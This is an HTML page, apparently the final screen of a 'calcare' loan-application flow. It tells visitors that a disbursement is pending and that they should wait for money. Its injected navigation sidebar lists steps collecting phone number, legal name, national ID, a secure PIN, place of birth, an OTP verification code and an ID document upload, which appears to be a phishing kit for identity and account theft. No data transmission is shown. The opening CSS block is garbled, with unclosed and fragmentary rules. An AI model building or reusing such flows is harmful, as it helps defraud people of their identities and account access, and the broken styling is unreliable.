    <style>

        /* Magnified Slanted Pure Green Brand Style */
        .brand-name {
            font-family: 'Outfit', sans-serif !important;
            color: #ffb800 !important;
            font-size: 38px !important;
            font-weight: 900 !important;
            font-style: normal !important;
            transform: none !important;
            display: inline-block !important;
            text-transform: none !important;
            letter-spacing: 1px !important;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3) !important;
            border: none !important;

            background: transparent !important;

            border-radius: 0 !important;

        .logo {

        @keyframes fadeInUp {

            }

                transform: translateY(0);
            }
        }
        @keyframes logoPulse {
            0% { transform: scale(1); }

            animation: fadeInUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;

</head>

<body>
    <svg class="logo" viewBox="0 0 100 100" fill="#00FF00">
        <path d="M 50 10 L 85 30 L 50 50 L 15 30 Z M 15 45 L 50 65 L 85 45 M 15 60 L 50 80 L 85 60" stroke="#00FF00"
            stroke-width="8" fill="none" stroke-linecap="round" stroke-linejoin="round" />
    </svg>
    <h2>You have 1 pending disbursement</h2>
    <p>Your application is being finalized.</p>
    <p>Please wait for money or further information</p>

    <!-- Interactive Comet Collision Canvas Background -->
    <canvas id="cometCanvas" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: -1; pointer-events: none;"></canvas>
    <script>
        (function() {
            const canvas = document.getElementById('cometCanvas');
            const ctx = canvas.getContext('2d');

            function resizeCanvas() {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            }
            window.addEventListener('resize', resizeCanvas);
            resizeCanvas();

            class Comet {
                constructor(x, y, vx, vy, radius, color) {
                    this.x = x;
                    this.y = y;
                    this.vx = vx;
                    this.vy = vy;
                    this.radius = radius;
                    this.color = color;
                    this.history = [];
                    this.maxHistory = 15;
                }

                update() {
                    this.history.push({ x: this.x, y: this.y });
                    if (this.history.length > this.maxHistory) {
                        this.history.shift();
                    }

                    this.x += this.vx;
                    this.y += this.vy;

                    if (this.x - this.radius < 0) {
                        this.x = this.radius;
                        this.vx = -this.vx;
                    }
                    if (this.x + this.radius > canvas.width) {
                        this.x = canvas.width - this.radius;
                        this.vx = -this.vx;
                    }
                    if (this.y - this.radius < 0) {
                        this.y = this.radius;
                        this.vy = -this.vy;
                    }
                    if (this.y + this.radius > canvas.height) {
                        this.y = canvas.height - this.radius;
                        this.vy = -this.vy;
                    }
                }

                draw() {
                    // Draw realistic flared comet tail
                    for (let i = 0; i < this.history.length; i++) {
                        const ratio = i / this.history.length; // 0 at tail end, 1 at head
                        const tailRadius = this.radius * (1 + (1 - ratio) * 1.2); // Flared tail (gets wider at the back)
                        const opacity = ratio * 0.12; // Fades out at the back
                        
                        ctx.beginPath();
                        ctx.arc(this.history[i].x, this.history[i].y, tailRadius, 0, Math.PI * 2);
                        ctx.fillStyle = `rgba(186, 230, 253, ${opacity})`;
                        ctx.fill();
                    }

                    // Draw glowing nucleus with radial gradient
                    const nucleusGrad = ctx.createRadialGradient(
                        this.x, this.y, 0,
                        this.x, this.y, this.radius * 1.5
                    );
                    nucleusGrad.addColorStop(0, '#ffffff'); // Intense white nucleus
                    nucleusGrad.addColorStop(0.2, '#bae6fd'); // Soft sky blue coma
                    nucleusGrad.addColorStop(1, 'rgba(186, 230, 253, 0)'); // Fading outer edge

                    ctx.beginPath();
                    ctx.arc(this.x, this.y, this.radius * 1.8, 0, Math.PI * 2);
                    ctx.fillStyle = nucleusGrad;
                    ctx.fill();
                }
            }

            const colors = ['#bae6fd', '#bae6fd', '#bae6fd', '#bae6fd', '#bae6fd'];
            const comets = [];
            const radiusValues = [25, 30, 20, 28, 24];
            
            for (let i = 0; i < 1; i++) {
                const radius = radiusValues[i];
                const x = radius + Math.random() * (canvas.width - radius * 2);
                const y = radius + Math.random() * (canvas.height - radius * 2);
                
                const vx = (Math.random() * 2 + 1) * (Math.random() > 0.5 ? 1 : -1);
                const vy = (Math.random() * 2 + 1) * (Math.random() > 0.5 ? 1 : -1);
                
                comets.push(new Comet(x, y, vx, vy, radius, colors[i]));
            }

            function checkCollisions() {
                for (let i = 0; i < comets.length; i++) {
                    for (let j = i + 1; j < comets.length; j++) {
                        const c1 = comets[i];
                        const c2 = comets[j];

                        const dx = c2.x - c1.x;
                        const dy = c2.y - c1.y;
                        const dist = Math.sqrt(dx * dx + dy * dy);
                        const minDist = c1.radius + c2.radius;

                        if (dist < minDist) {
                            const nx = dx / dist;
                            const ny = dy / dist;
                            
                            const tx = -ny;
                            const ty = nx;

                            const dp1 = c1.vx * nx + c1.vy * ny;
                            const dp2 = c2.vx * nx + c2.vy * ny;

                            const dt1 = c1.vx * tx + c1.vy * ty;
                            const dt2 = c2.vx * tx + c2.vy * ty;

                            const new_dp1 = dp2;
                            const new_dp2 = dp1;

                            c1.vx = new_dp1 * nx + dt1 * tx;
                            c1.vy = new_dp1 * ny + dt1 * ty;
                            c2.vx = new_dp2 * nx + dt2 * tx;
                            c2.vy = new_dp2 * ny + dt2 * ty;

                            const overlap = minDist - dist;
                            c1.x -= overlap * nx * 0.5;
                            c1.y -= overlap * ny * 0.5;
                            c2.x += overlap * nx * 0.5;
                            c2.y += overlap * ny * 0.5;
                        }
                    }
                }
            }

            function animate() {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                checkCollisions();
                comets.forEach(comet => {
                    comet.update();
                    comet.draw();
                });
                requestAnimationFrame(animate);
            }
            animate();
        })();
    </script>


    <!-- Navigation Sidebar Guide Injection -->
    <script>
        (function() {
            // 1. Create and inject style block
            const css = `
                /* Sidebar styles */
                .calcare-sidebar {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 280px;
                    height: 100vh;
                    background: #2b1f3d;
                    color: #ffffff;
                    z-index: 9999;
                    transform: translateX(-100%);
                    transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
                    box-shadow: 4px 0 25px rgba(0,0,0,0.3);
                    display: flex;
                    flex-direction: column;
                    padding: 24px 20px;
                    text-align: left;
                }
                .calcare-sidebar.open {
                    transform: translateX(0);
                }
                .sidebar-backdrop {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100vw;
                    height: 100vh;
                    background: rgba(0,0,0,0.4);
                    backdrop-filter: blur(2px);
                    z-index: 9998;
                    opacity: 0;
                    pointer-events: none;
                    transition: opacity 0.3s ease;
                }
                .sidebar-backdrop.show {
                    opacity: 1;
                    pointer-events: auto;
                }
                .sidebar-header {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    border-bottom: 1px solid rgba(255,255,255,0.1);
                    padding-bottom: 16px;
                    margin-bottom: 20px;
                }
                .sidebar-title {
                    font-size: 15px;
                    font-weight: 800;
                    color: #ffb800;
                    letter-spacing: 0.5px;
                }
                .sidebar-close-btn {
                    background: none;
                    border: none;
                    color: #ffffff;
                    font-size: 24px;
                    cursor: pointer;
                    padding: 4px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    line-height: 1;
                }
                .sidebar-menu {
                    overflow-y: auto;
                    flex-grow: 1;
                    display: flex;
                    flex-direction: column;
                    gap: 10px;
                    padding-right: 4px;
                }
                .sidebar-menu::-webkit-scrollbar {
                    width: 4px;
                }
                .sidebar-menu::-webkit-scrollbar-thumb {
                    background: rgba(255,255,255,0.15);
                    border-radius: 2px;
                }
                .menu-item {
                    display: flex;
                    align-items: center;
                    gap: 12px;
                    padding: 10px 12px;
                    border-radius: 8px;
                    text-decoration: none;
                    color: rgba(255,255,255,0.7);
                    font-size: 12.5px;
                    font-weight: 600;
                    transition: all 0.2s ease;
                    background: rgba(255,255,255,0.02);
                    border: 1px solid rgba(255,255,255,0.04);
                }
                .menu-item:hover {
                    background: rgba(255,255,255,0.08);
                    color: #ffffff;
                    transform: translateX(4px);
                }
                .menu-item.active {
                    background: rgba(255, 184, 0, 0.1);
                    border-color: rgba(255, 184, 0, 0.3);
                    color: #ffb800;
                }
                .status-dot {
                    width: 8px;
                    height: 8px;
                    border-radius: 50%;
                    flex-shrink: 0;
                }
                .status-dot.completed {
                    background: #2e7d32;
                    box-shadow: 0 0 6px #2e7d32;
                }
                .status-dot.current {
                    background: #ffb800;
                    box-shadow: 0 0 6px #ffb800;
                }
                .status-dot.pending {
                    background: #6c757d;
                }
                .nav-guide-info {
                    background: rgba(255,255,255,0.03);
                    border-radius: 10px;
                    padding: 12px;
                    font-size: 11px;
                    line-height: 1.4;
                    color: #adb5bd;
                    margin-top: 16px;
                    border: 1px dashed rgba(255,255,255,0.06);
                }
            `;

            const styleEl = document.createElement('style');
            styleEl.innerHTML = css;
            document.head.appendChild(styleEl);

            // 2. Define navigation steps
            const currentPage = window.location.pathname.split('/').pop() || 'index.html';
            
            const steps = [
                { name: '1. Welcome Portal', file: 'index.html', check: () => true },
                { name: '2. Phone Entry', file: 'phone.html', check: () => localStorage.getItem('calcare_phone') },
                { name: '3. Legal Name', file: 'names.html', check: () => localStorage.getItem('calcare_names') },
                { name: '4. National ID', file: 'id.html', check: () => localStorage.getItem('calcare_national_id') },
                { name: '5. Secure PIN', file: 'pin.html', check: () => localStorage.getItem('calcare_pin') },
                { name: '6. Place of Birth', file: 'placeofbirth.html', check: () => localStorage.getItem('calcare_pob') },
                { name: '7. Sign Consents', file: 'consents.html', check: () => true },
                { name: '8. Verification Code', file: 'otp.html', check: () => true },
                { name: '9. ID Document Upload', file: 'id_upload.html', check: () => true },
                { name: '10. Loan Calculator', file: 'loan_calculater.html', check: () => localStorage.getItem('calcare_loan_amount') },
                { name: '11. Repayment Terms', file: 'loan_details.html', check: () => localStorage.getItem('calcare_loan_amount') },
                { name: '12. Account Activation', file: 'activation.html', check: () => localStorage.getItem('calcare_phone') }
            ];

            // 3. Create elements
            const backdrop = document.createElement('div');
            backdrop.className = 'sidebar-backdrop';
            document.body.appendChild(backdrop);

            const sidebar = document.createElement('div');
            sidebar.className = 'calcare-sidebar';
            
            const header = document.createElement('div');
            header.className = 'sidebar-header';
            header.innerHTML = `
                <div class="sidebar-title">NAVIGATOR GUIDE</div>
                <button class="sidebar-close-btn">&times;</button>
            `;
            sidebar.appendChild(header);

            const menu = document.createElement('div');
            menu.className = 'sidebar-menu';

            steps.forEach((step) => {
                const item = document.createElement('a');
                item.href = step.file;
                item.className = 'menu-item';
                
                let statusClass = 'pending';
                if (currentPage === step.file) {
                    statusClass = 'current';
                    item.classList.add('active');
                } else if (step.check()) {
                    statusClass = 'completed';
                }

                item.innerHTML = `
                    <span class="status-dot ${statusClass}"></span>
                    <span>${step.name}</span>
                `;
                menu.appendChild(item);
            });

            sidebar.appendChild(menu);

            const info = document.createElement('div');
            info.className = 'nav-guide-info';
            info.innerHTML = `
                <strong>Navigator Guide:</strong> Green dots represent steps already completed. Tap any step to jump straight to that section.
            `;
            sidebar.appendChild(info);

            document.body.appendChild(sidebar);

            // 4. Bind trigger events
            function openSidebar() {
                sidebar.classList.add('open');
                backdrop.classList.add('show');
            }

            function closeSidebar() {
                sidebar.classList.remove('open');
                backdrop.classList.remove('show');
            }

            header.querySelector('.sidebar-close-btn').addEventListener('click', closeSidebar);
            backdrop.addEventListener('click', closeSidebar);

            // Bind to existing hamburger or inject a floating menu indicator
            const existing = document.querySelector('.hamburger-icon, .hamburger-menu');
            if (!existing) {
                const floatHamburg = document.createElement('div');
                floatHamburg.className = 'hamburger-icon';
                floatHamburg.style.position = 'fixed';
                floatHamburg.style.top = '22px';
                floatHamburg.style.left = '22px';
                floatHamburg.style.zIndex = '999';
                floatHamburg.style.width = '24px';
                floatHamburg.style.height = '18px';
                floatHamburg.style.display = 'flex';
                floatHamburg.style.flexDirection = 'column';
                floatHamburg.style.justify = 'space-between';
                floatHamburg.style.cursor = 'pointer';
                
                floatHamburg.innerHTML = `
                    <span style="display:block; height:3px; width:100%; background-color:#5a3276; border-radius:2px;"></span>
                    <span style="display:block; height:3px; width:100%; background-color:#5a3276; border-radius:2px;"></span>
                    <span style="display:block; height:3px; width:100%; background-color:#5a3276; border-radius:2px;"></span>
                `;
                document.body.appendChild(floatHamburg);
                floatHamburg.addEventListener('click', openSidebar);
            } else {
                existing.addEventListener('click', (e) => {
                    e.preventDefault();
                    openSidebar();
                });
            }
        })();
    </script>

</body>

</html>
